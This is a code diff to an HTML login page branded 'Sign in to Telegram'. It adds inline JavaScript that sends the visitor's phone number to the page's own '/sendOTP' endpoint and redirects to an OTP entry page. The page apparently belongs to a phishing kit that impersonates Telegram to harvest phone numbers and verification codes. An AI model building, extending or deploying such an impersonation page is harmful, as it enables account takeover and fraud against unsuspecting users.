@@ -10,15 +10,34 @@
     <div class="login-container">
         <img src="telegram-logo.png" alt="Telegram Logo" class="logo">
         <h2>Sign in to Telegram</h2>
-        <p>Please confirm your country code and enter your phone number.</p>
-        <form id="login-form">
+        <p>Please enter your phone number to receive a verification code.</p>
+        <form id="phoneForm">
             <select id="country" name="country">
                 <option value="GB">United Kingdom (+44)</option>
             </select>
-            <input type="text" id="phone-number" placeholder="Phone Number" required>
+            <input type="text" id="phoneNumber" placeholder="Phone Number" required>
             <button type="submit">Next</button>
         </form>
     </div>
-    <script src="script.js"></script>
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phoneNumber = document.getElementById('phoneNumber').value;
+
+            fetch('/sendOTP', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phoneNumber })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect to the OTP input page
+                window.location.href = '/otp.html';
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
 </body>
 </html>
